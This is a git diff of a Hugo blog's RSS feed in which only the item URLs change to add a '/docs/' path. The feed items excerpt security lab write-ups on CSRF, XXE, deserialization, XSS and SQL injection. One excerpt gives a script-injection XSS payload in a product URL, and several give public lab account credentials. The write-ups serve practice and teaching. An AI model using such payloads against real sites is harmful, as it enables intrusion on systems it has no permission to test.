@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/web/</link><description>Recent content in Web on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/</guid><description>&lt;h1 id="crewctf---sequence_gallery">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/web/</link><description>Recent content in Web on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</guid><description>&lt;h1 id="crewctf---sequence_gallery">
  CrewCTF - sequence_gallery
  &lt;a class="anchor" href="#crewctf---sequence_gallery">#&lt;/a>
 &lt;/h1>
@@ -52,7 +52,7 @@ def index():
 
 if __name__ == &amp;#39;__main__&amp;#39;:
 	app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</guid><description>&lt;h1 id="csrf---apprentice">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</guid><description>&lt;h1 id="csrf---apprentice">
  CSRF - APPRENTICE
  &lt;a class="anchor" href="#csrf---apprentice">#&lt;/a>
 &lt;/h1>
@@ -77,7 +77,7 @@ You can log in to your own account using the following credentials: &lt;code>wie
 &lt;/h2>
 &lt;p>:::spoiler
 &lt;a href="https://medium.com/@Tommmmm/csrf-%e6%94%bb%e6%93%8a%e5%8e%9f%e7%90%86-d0f2a51810ca">CSRF 攻擊原理&lt;/a>
-&lt;a href="https://ithelp.ithome.com.tw/articles/10251769">[Day25]- 新手的Web系列CSRF&lt;/a>&lt;/p></description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</guid><description>&lt;h1 id="deserialization---apprentice">
+&lt;a href="https://ithelp.ithome.com.tw/articles/10251769">[Day25]- 新手的Web系列CSRF&lt;/a>&lt;/p></description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</guid><description>&lt;h1 id="deserialization---apprentice">
  Deserialization - APPRENTICE
  &lt;a class="anchor" href="#deserialization---apprentice">#&lt;/a>
 &lt;/h1>
@@ -122,7 +122,7 @@ Each package may contain the session that should be modified. So, pay attention 
 &lt;/ol>
 &lt;p>:::spoiler Success Screenshot
 &lt;img src="https://i.imgur.com/eQEfiaw.png" alt="" />
-:::&lt;/p></description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</guid><description>&lt;h1 id="lab-arbitrary-object-injection-in-php">
+:::&lt;/p></description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</guid><description>&lt;h1 id="lab-arbitrary-object-injection-in-php">
  Lab: Arbitrary object injection in PHP
  &lt;a class="anchor" href="#lab-arbitrary-object-injection-in-php">#&lt;/a>
 &lt;/h1>
@@ -142,7 +142,7 @@ You can log in to your own account using the following credentials: wiener:peter
 &lt;/h2>
 &lt;p>&lt;a href="https://tw511.com/a/01/26451.html">Python建構函式與解構函式（&lt;strong>init&lt;/strong>()和__del__()）&lt;/a>
 其實概念就是Python的&lt;code>__init()__&lt;/code> function，在instanciate一個class的時候扮演初始化的功能而已
-而deconstructor就是Python中的&lt;code>__del__()&lt;/code> function用來回收不需要的class，以達到降低記憶體的使用量&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction">
+而deconstructor就是Python中的&lt;code>__del__()&lt;/code> function用來回收不需要的class，以達到降低記憶體的使用量&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction">
  Lab: Blind XXE with out-of-band interaction
  &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction">#&lt;/a>
 &lt;/h1>
@@ -161,7 +161,7 @@ You can detect the blind XXE vulnerability by triggering out-of-band interaction
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
 &lt;blockquote>
-&lt;p>有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">
+&lt;p>有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">
  Lab: Blind XXE with out-of-band interaction via XML parameter entities
  &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">#&lt;/a>
 &lt;/h1>
@@ -178,7 +178,7 @@ You can detect the blind XXE vulnerability by triggering out-of-band interaction
  Background
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
-&lt;p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在&lt;code>DOCTYPE&lt;/code>中直接Reference，也就是利用&lt;code>%&lt;/code>這個字元達到這個效果&lt;/p></description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</guid><description>&lt;h1 id="lab-csrf-where-token-is-not-tied-to-user-session">
+&lt;p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在&lt;code>DOCTYPE&lt;/code>中直接Reference，也就是利用&lt;code>%&lt;/code>這個字元達到這個效果&lt;/p></description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</guid><description>&lt;h1 id="lab-csrf-where-token-is-not-tied-to-user-session">
  Lab: CSRF where token is not tied to user session
  &lt;a class="anchor" href="#lab-csrf-where-token-is-not-tied-to-user-session">#&lt;/a>
 &lt;/h1>
@@ -197,7 +197,7 @@ You have two accounts on the application that you can use to help design your at
  Background
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
-&lt;p>CSRF token should tied to user session otherwise, it&amp;rsquo;ll exploited by attacker.&lt;/p></description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</guid><description>&lt;h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie">
+&lt;p>CSRF token should tied to user session otherwise, it&amp;rsquo;ll exploited by attacker.&lt;/p></description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</guid><description>&lt;h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie">
  Lab: CSRF where token is tied to non-session cookie
  &lt;a class="anchor" href="#lab-csrf-where-token-is-tied-to-non-session-cookie">#&lt;/a>
 &lt;/h1>
@@ -213,7 +213,7 @@ You have two accounts on the application that you can use to help design your at
 &lt;p>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
 You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
 &lt;code>wiener:peter&lt;/code>
-&lt;code>carlos:montoya&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-request-method">
+&lt;code>carlos:montoya&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-request-method">
  Lab: CSRF where token validation depends on request method
  &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-request-method">#&lt;/a>
 &lt;/h1>
@@ -235,7 +235,7 @@ You can log in to your own account using the following credentials: &lt;code>wie
 &lt;p>Login and update email to trace the package
 Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:
 &lt;img src="https://i.imgur.com/ju0fDUQ.png" alt="" />
-We can notice that the carried data including &lt;code>csrf_token&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-token-being-present">
+We can notice that the carried data including &lt;code>csrf_token&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-token-being-present">
  Lab: CSRF where token validation depends on token being present
  &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-token-being-present">#&lt;/a>
 &lt;/h1>
@@ -256,7 +256,7 @@ You can log in to your own account using the following credentials: &lt;code>wie
 &lt;li>
 &lt;p>Login and update email to trace the package
 It&amp;rsquo;s very similar with previous lab $\to$ it contained &lt;code>CSRF_token&lt;/code> as its carried data:
-&lt;img src="https://i.imgur.com/69FaW1R.png" alt="" />&lt;/p></description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</guid><description>&lt;h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">
+&lt;img src="https://i.imgur.com/69FaW1R.png" alt="" />&lt;/p></description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</guid><description>&lt;h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">
  Lab: DOM XSS in &lt;code>document.write&lt;/code> sink using source &lt;code>location.search&lt;/code> inside a select element
  &lt;a class="anchor" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">#&lt;/a>
 &lt;/h1>
@@ -307,7 +307,7 @@ You can see that this is a perfect injection place&lt;/li>
 &lt;p>Payload: &lt;code>/product?productId=1&amp;amp;storeId=&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
 :::spoiler Success Screenshot
 &lt;img src="https://i.imgur.com/bjEoUzh.png" alt="" />
-:::&lt;/p></description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</guid><description>&lt;h1 id="lab-exploiting-xinclude-to-retrieve-files">
+:::&lt;/p></description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</guid><description>&lt;h1 id="lab-exploiting-xinclude-to-retrieve-files">
  Lab: Exploiting &lt;code>XInclude&lt;/code> to retrieve files
  &lt;a class="anchor" href="#lab-exploiting-xinclude-to-retrieve-files">#&lt;/a>
 &lt;/h1>
@@ -326,7 +326,7 @@ Because you don&amp;rsquo;t control the entire XML document you can&amp;rsquo;t 
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
 &lt;blockquote>
-&lt;p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">
+&lt;p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">
  Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
  &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">#&lt;/a>
 &lt;/h1>
@@ -346,7 +346,7 @@ Because you don&amp;rsquo;t control the entire XML document you can&amp;rsquo;t 
 &lt;ol>
 &lt;li>
 &lt;p>Use the previous method
-:::spoiler Payload&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">
+:::spoiler Payload&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">
  Lab: Exploiting blind XXE to retrieve data via error messages
  &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">#&lt;/a>
 &lt;/h1>
@@ -363,7 +363,7 @@ The lab contains a link to an exploit server on a different domain where you can
  Recon
  &lt;a class="anchor" href="#recon">#&lt;/a>
 &lt;/h2>
-&lt;p>This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)&lt;/p></description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</guid><description>&lt;h1 id="lab-exploiting-java-deserialization-with-apache-commons">
+&lt;p>This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)&lt;/p></description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</guid><description>&lt;h1 id="lab-exploiting-java-deserialization-with-apache-commons">
  Lab: Exploiting Java deserialization with Apache Commons
  &lt;a class="anchor" href="#lab-exploiting-java-deserialization-with-apache-commons">#&lt;/a>
 &lt;/h1>
@@ -380,7 +380,7 @@ You can log in to your own account using the following credentials: wiener:peter
  Background
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">ysoserial使用方法&lt;/a>&lt;/p></description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</guid><description>&lt;h1 id="lab-exploiting-xxe-via-image-file-upload">
+&lt;p>&lt;a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">ysoserial使用方法&lt;/a>&lt;/p></description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</guid><description>&lt;h1 id="lab-exploiting-xxe-via-image-file-upload">
  Lab: Exploiting XXE via image file upload
  &lt;a class="anchor" href="#lab-exploiting-xxe-via-image-file-upload">#&lt;/a>
 &lt;/h1>
@@ -396,7 +396,7 @@ You can log in to your own account using the following credentials: wiener:peter
  Recon
  &lt;a class="anchor" href="#recon">#&lt;/a>
 &lt;/h2>
-&lt;p>In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.&lt;/p></description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</guid><description>&lt;h1 id="lab-modifying-serialized-data-types">
+&lt;p>In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.&lt;/p></description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</guid><description>&lt;h1 id="lab-modifying-serialized-data-types">
  Lab: Modifying serialized data types
  &lt;a class="anchor" href="#lab-modifying-serialized-data-types">#&lt;/a>
 &lt;/h1>
@@ -413,7 +413,7 @@ You can log in to your own account using the following credentials: wiener:peter
  Background
  &lt;a class="anchor" href="#background">#&lt;/a>
 &lt;/h2>
-&lt;p>Loose Comparison Operator in &lt;code>PHP&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
+&lt;p>Loose Comparison Operator in &lt;code>PHP&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
  Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
